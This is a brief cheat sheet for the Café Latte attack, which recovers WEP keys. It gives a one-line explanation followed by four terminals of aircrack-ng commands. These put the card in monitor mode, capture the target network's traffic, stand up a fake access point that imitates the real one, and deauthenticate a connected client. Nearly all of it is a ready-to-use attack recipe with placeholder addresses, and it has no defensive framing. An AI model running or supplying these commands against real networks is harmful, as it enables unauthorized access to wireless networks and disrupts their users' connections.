The Café Latte attack recovers a WEP key by tricking a disconnected wireless client into generating encrypted ARP traffic, allowing the attacker to crack the key without needing to capture packets from the access point.

First Terminal:

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng wlan0mon --bssid <AP_MAC> -c <channel> -w WEP
````

Second Terminal:

```bash
aireplay-ng -6 -D -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
```

Third Terminal:

```bash
airbase-ng -c 1 -a <AP_MAC>  -e "<ESSID>" wlan0mon -W 1 -L
```

Fourth Terminal:

```bash
aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC>  wlan0mon
```